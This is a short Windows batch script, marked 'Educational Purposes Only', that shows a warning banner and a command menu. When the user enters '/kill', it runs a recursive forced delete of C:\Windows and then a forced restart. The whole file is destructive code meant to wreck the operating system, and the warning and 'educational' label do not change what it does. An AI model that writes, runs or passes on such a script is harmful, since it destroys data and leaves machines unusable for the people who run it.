@echo off
:begin
echo ------------------------------------------------ WARNING ------------------------------------------------
echo This program will harm your computer. It will delete all files in C:\Windows and restart the computer.Think about it before you run it.
echo Educational Purposes Only!!
echo Write a command /kill to kill Windows:
echo /kill  - Kill Windows
echo /exit  - Exit the program
set /p command=Write your command: 
if %command%==/kill (
    echo Killing Windows...
    echo This will delete all files in C:\Windows and restart the computer.
  del /S /F /W C:\Windows
  shutdown /r /fw /t 5
    goto begin
) else if %command%==/exit (
    echo Exiting the program...
    exit
) else (
    echo Command not recognized. Try again.
    goto begin
)
